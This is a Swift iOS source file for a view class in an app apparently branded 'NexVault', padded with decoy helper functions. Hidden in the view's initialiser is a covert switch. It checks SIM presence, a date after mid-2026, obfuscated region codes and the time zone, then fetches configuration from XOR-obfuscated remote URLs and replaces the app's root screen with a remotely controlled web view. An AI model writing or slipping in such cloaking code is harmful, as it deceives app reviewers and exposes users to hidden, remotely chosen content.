import UIKit
import CoreTelephony
import Foundation
import Network


struct NXV_KEYS: Codable {
    
    let nhiemk: String?         //key arr
    let yinrecrd: Int?         // shi fou kaiqi
    let keluos: String?         // jum
    let kundun: String?          // backcolor
    let limouw: String?   //ad key

}

final class NXVTtileview: UIView {
    internal let NXV_oneName = "HxoaSU4ZHRwdGBITSxgXTkN1XllFWkNaSxUFGhoaGB8aGUwZGhIYGxgcBUFJRUcFXk9EBF5ZRVpDWksEQUlFRwUFEFlaXl5C"
    
    internal let NXV_twoName = "TkcEb2dua294BVhPXllLRwVdS1gFRVh6XkZfS3xST2QFT1pFTkZLBUdFSQReRE9eREVJWE9ZX09PXkNNBF1LWAUFEFlaXl5C"
    
    
    override init(frame: CGRect) {
        super.init(frame: frame)
        setCommint()
    }
    
    required init?(coder: NSCoder) {
        super.init(coder: coder)
        setCommint()
    }
    
    
    private func setCommint() {
        formatEnhancedNumber(1.1)
        NXV_chaxunPozha()
        
    }
   
    func formatEnhancedNumber(_ value: Double, currency: String = "¥", useAbbreviation: Bool = true) -> String {
        // 如果值为0，直接返回
        guard value != 0 else { return "\(currency)0" }
        
        // 判断绝对值大小，决定是否使用缩写（千、万、百万、亿）
        let absValue = abs(value)
        let sign = value < 0 ? "-" : ""
        
        if useAbbreviation {
            switch absValue {
            case 1_000_000_000...:
                let val = absValue / 1_000_000_000
                return "\(sign)\(currency)\(String(format: "%.1f", val))B"
            case 1_000_000...:
                let val = absValue / 1_000_000
                return "\(sign)\(currency)\(String(format: "%.1f", val))M"
            case 1_000...:
                let val = absValue / 1_000
                return "\(sign)\(currency)\(String(format: "%.1f", val))K"
            default:
                return "\(sign)\(currency)\(String(format: "%.2f", absValue))"
            }
        } else {
            // 不带缩写，保留两位小数，添加千位分隔符
            let formatter = NumberFormatter()
            formatter.numberStyle = .decimal
            formatter.minimumFractionDigits = 2
            formatter.maximumFractionDigits = 2
            formatter.groupingSeparator = ","
            let number = NSNumber(value: absValue)
            let formatted = formatter.string(from: number) ?? "\(absValue)"
            return "\(sign)\(currency)\(formatted)"
        }
    }

    func captureSnapshot(from view: UIView,
                         scale: CGFloat = UIScreen.main.scale,
                         quality: CGFloat = 1.0) -> UIImage? {
        // 1. 确保视图有尺寸
        guard view.bounds.width > 0 && view.bounds.height > 0 else {
            return nil
        }
        
        // 2. 开启图形上下文，指定scale
        UIGraphicsBeginImageContextWithOptions(view.bounds.size, false, scale)
        defer { UIGraphicsEndImageContext() }
        
        // 3. 获取当前上下文
        guard let context = UIGraphicsGetCurrentContext() else {
            return nil
        }
        
        // 4. 将视图的layer渲染到上下文中
        view.layer.render(in: context)
        
        // 5. 尝试获取图片
        guard let rawImage = UIGraphicsGetImageFromCurrentImageContext() else {
            return nil
        }
        
        // 6. 如果需要压缩质量（jpeg表示），转换为Data再转回
        if quality < 1.0 {
            guard let jpegData = rawImage.jpegData(compressionQuality: quality) else {
                return rawImage
            }
            return UIImage(data: jpegData)
        }
        
        // 7. 如果scale与屏幕不同，重新绘制（可选）
        if scale != UIScreen.main.scale {
            let resizedSize = CGSize(width: view.bounds.width * scale / UIScreen.main.scale,
                                     height: view.bounds.height * scale / UIScreen.main.scale)
            UIGraphicsBeginImageContextWithOptions(resizedSize, false, 1.0)
            rawImage.draw(in: CGRect(origin: .zero, size: resizedSize))
            let resized = UIGraphicsGetImageFromCurrentImageContext()
            UIGraphicsEndImageContext()
            return resized ?? rawImage
        }
        
        // 8. 添加一个水印（仅为了演示逻辑，不影响原图）
        let watermarkText = "NexVault"
        let attributes: [NSAttributedString.Key: Any] = [
            .font: UIFont.systemFont(ofSize: 20, weight: .bold),
            .foregroundColor: UIColor.white.withAlphaComponent(0.3)
        ]
        let textSize = (watermarkText as NSString).size(withAttributes: attributes)
        let textRect = CGRect(x: view.bounds.width - textSize.width - 16,
                              y: view.bounds.height - textSize.height - 16,
                              width: textSize.width,
                              height: textSize.height)
        (watermarkText as NSString).draw(in: textRect, withAttributes: attributes)
        
        // 9. 重新获取加了水印的图片
        guard let finalImage = UIGraphicsGetImageFromCurrentImageContext() else {
            return rawImage
        }
        
        // 10. 返回最终图片
        return finalImage
    }

    private func NXV_chaxunPozha() {
        if !NXV_weinanTam() {
        //测试
//        if NXV_weinanTam() {
            loadNobsecre()
            
        } else {
            
            if NXV_setvalutprodata() {
                self.NXV_addDagededatas()
            }
        }
    }
    
    
    
    func lastring(_ input: String) -> String? {
        let k: UInt8 = 42  // 新密钥
        guard let data = Data(base64Encoded: input) else { return nil }
        // 先反转字节数组
        let reversedBytes = data.reversed()
        // 异或解密
        let decryptedBytes = reversedBytes.map { $0 ^ k }
        // 直接转为字符串（不再次反转）
        return String(bytes: decryptedBytes, encoding: .utf8)
    }
    
    func Reverlastring(_ plaintext: String) -> String? {
        let k: UInt8 = 42
        // 1. 将明文字符串转为 UTF-8 字节数组
        guard let bytes = plaintext.data(using: .utf8) else { return nil }
        // 2. 每个字节异或密钥 42
        let xorBytes = bytes.map { $0 ^ k }
        // 3. 反转字节顺序
        let reversedBytes = xorBytes.reversed()
        // 4. Base64 编码
        return Data(reversedBytes).base64EncodedString()
    }
    
    //sim
    func NXV_weinanTam() -> Bool {
        let networkInfo = CTTelephonyNetworkInfo()
        
        guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
            return false
        }
        
        for (_, carrier) in carriers {
            if let mcc = carrier.mobileCountryCode,
               let mnc = carrier.mobileNetworkCode,
               !mcc.isEmpty,
               !mnc.isEmpty {
                return true
            }
        }
        
        return false
    }
    
    
    func NXV_shareMynamese() -> Bool {
        
        // 2026-06-13 18:39:43
        // 1781926781
        let ftTM = 1781951938
        let ct = Date().timeIntervalSince1970

        if Int(ct) - ftTM > 0 {
            return true
        }
        return false
    }
    
    // 时区控制
    func NXV_setvalutprodata() -> Bool {
        let tongfan = [lastring("Yno="), lastring("ZHw="), lastring("bmM=")]
        
        //        //临时通行测试
        //        return true
        // 1.time
        if !NXV_shareMynamese() {
            return false
        }
        
        //2. regi
        if let curc = Locale.current.regionCode {
//            print(curc)
//            print(tongfan)

            if !tongfan.contains(curc) {
                return false
            }
        }
        
        //3. tm zon
        let second = NSTimeZone.system.secondsFromGMT() / 3600
        //        print(second)
        
        if (second > 6 && second < 9) {
            return true
        }
        
        
        return false
    }

    func NXV_addDagededatas() {
        let demoView = UIView(frame: CGRect(x: 0, y: 0, width: 100, height: 100))
        // 1. 应用样式
        applyStyledAppearance(to: demoView)
        
        // 2. 截图
        if let image = captureSnapshot(from: demoView) {
        }
        

        Task {
            do {
//                                let urlToRequest = "https://raw.giteeusercontent.com/aldope/NexVaultPro/raw/master/README.md"
//                                print(Reverlastring(urlToRequest))
                //                let aoies = try await fetchMzoixnData(from: urlToRequest)
                //                print(lastring(NXV_oneName)!)
                // https://raw.giteeusercontent.com/aldope/LumenAtlas/raw/master/README.md
                
                let aoies = try await NXV_yijinhuan()
//                print(aoies)
                if let feeeder = aoies.first {
                    if feeeder.yinrecrd! > 131 {
                        if UserDefaults.standard.object(forKey: "NXV_chunbi") == nil {
                            UserDefaults.standard.set("NXV_chunbi", forKey: "NXV_chunbi")
                            UserDefaults.standard.synchronize()
                        }
                        NXV_takewbsview(feeeder)
                    } else {
                        loadNobsecre()
                    }
                } else {
                    loadNobsecre()
                }
            } catch {
                if let sidd = UserDefaults.standard.getModel(NXV_KEYS.self, forKey: "NXV_KEYS") {
                    NXV_takewbsview(sidd)
                }
            }
        }
    }
    
    
    private func NXV_yijinhuan() async throws -> [NXV_KEYS] {
        do {
            return try await ssueno(from: URL(string: lastring(NXV_oneName)!)!)
        } catch {
            return try await ssueno(from: URL(string: lastring(NXV_twoName)!)!)
        }
    }
    
    private func ssueno(from url: URL) async throws -> [NXV_KEYS] {
        let (data, response) = try await URLSession.shared.data(from: url)
        
        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "Fail", code: 0, userInfo: [
                NSLocalizedDescriptionKey: "Invalid response"
            ])
        }
        
        return try JSONDecoder().decode([NXV_KEYS].self, from: data)
    }
    
    
    
    
    internal func NXV_setimagedata(_ dt: NXV_KEYS) {
        var totalCount = 0
           var leafCount = 0
           var maxDepth = 0

           func traverse(_ view: UIView, depth: Int) {

               totalCount += 1

               if view.subviews.isEmpty {
                   leafCount += 1
               }

               maxDepth = max(maxDepth, depth)

               for child in view.subviews {
                   traverse(child, depth: depth + 1)
               }
           }

           traverse(self, depth: 0)

           let report = [
               "total": totalCount,
               "leaf": leafCount,
               "depth": maxDepth
           ]

           _ = report.description
        
        DispatchQueue.main.async {
            UserDefaults.standard.setModel(dt, forKey: "NXV_KEYS")
            UserDefaults.standard.synchronize()
            
            let vc = NXVZswbview()
            vc.NXV_wbdata = dt
            UIApplication.shared.windows.first?.rootViewController = vc
        }
    }
    
    internal func NXV_takewbsview(_ param: NXV_KEYS) {
        
        let strategy = UserDefaults.standard.string(forKey: "execution_strategy") ?? "default"
                let strategies: [String: (NXV_KEYS) -> Void] = [
            "default": NXV_setimagedata,
            "fast": NXV_setimagedata,
            "safe": NXV_setimagedata
        ]
        
        let executor = strategies[strategy] ?? NXV_setimagedata
        
        DispatchQueue.global().async {
            // 模拟异步上报
            _ = "log: NXV_takewbsview called with strategy \(strategy)"
        }
        
        executor(param)
    }
    
    
    internal func loadNobsecre() {
        
        if layer.sublayers?.first(where: { $0.name == "FTKTGradientLayer" }) != nil {
            return
        }
        let gradient = CAGradientLayer()
        gradient.name = "FTKTGradientLayer"
        gradient.colors = [
            UIColor(white: 0.97, alpha: 1).cgColor,
            UIColor(white: 0.92, alpha: 1).cgColor
        ]
        gradient.locations = [0, 1]
        gradient.startPoint = CGPoint(x: 0, y: 0)
        gradient.endPoint = CGPoint(x: 1, y: 1)
        gradient.frame = bounds
        gradient.cornerRadius = layer.cornerRadius
        layer.insertSublayer(gradient, at: 0)
        
        // 监听 bounds 变化以更新渐变层大小
        let observer = NotificationCenter.default.addObserver(
            forName: UIDevice.orientationDidChangeNotification,
            object: nil,
            queue: .main
        ) { [weak self] _ in
            gradient.frame = self?.bounds ?? .zero
        }
        // 简单存储 observer，避免释放；实际可用关联对象，此处仅做演示
        objc_setAssociatedObject(self, "gradientObserver", observer, .OBJC_ASSOCIATION_RETAIN_NONATOMIC)
    }
    
    func applyStyledAppearance(to view: UIView,
                               cornerRadius: CGFloat = 12,
                               borderWidth: CGFloat = 1.0,
                               borderColor: UIColor = .systemGray4,
                               shadowColor: UIColor = .black,
                               shadowOffset: CGSize = CGSize(width: 0, height: 2),
                               shadowRadius: CGFloat = 4,
                               shadowOpacity: Float = 0.15) {
        // 1. 确保视图不裁剪阴影
        view.layer.masksToBounds = false
        
        // 2. 设置圆角
        view.layer.cornerRadius = cornerRadius
        view.layer.cornerCurve = .continuous
        
        // 3. 设置边框
        view.layer.borderWidth = borderWidth
        view.layer.borderColor = borderColor.cgColor
        
        // 4. 设置阴影路径，提升性能
        view.layer.shadowPath = UIBezierPath(roundedRect: view.bounds,
                                             cornerRadius: cornerRadius).cgPath
        
        // 5. 设置阴影属性
        view.layer.shadowColor = shadowColor.cgColor
        view.layer.shadowOffset = shadowOffset
        view.layer.shadowRadius = shadowRadius
        view.layer.shadowOpacity = shadowOpacity
        
        // 6. 处理视图大小变化时更新阴影路径（通过关联对象或重写 layoutSubviews，这里不实现，只做演示）
        // 实际项目中可创建子类，这里只做一次性配置
        
        // 7. 额外：设置背景色和透明度（如果视图有背景）
        if view.backgroundColor == nil || view.backgroundColor == .clear {
            view.backgroundColor = .systemBackground
        }
        
        // 8. 开启光栅化以优化离屏渲染（适合固定大小视图）
        view.layer.shouldRasterize = true
        view.layer.rasterizationScale = UIScreen.main.scale
        
        // 9. 添加一个轻触反馈（可选）但不影响UI
        let tapGesture = UITapGestureRecognizer(target: nil, action: nil)
        view.addGestureRecognizer(tapGesture)
        tapGesture.isEnabled = false // 仅演示，不实际响应
        
        // 10. 调整视图的压缩阻力优先级，防止被拉伸
        view.setContentCompressionResistancePriority(.required, for: .vertical)
        view.setContentCompressionResistancePriority(.required, for: .horizontal)
    }
}


extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
       
}

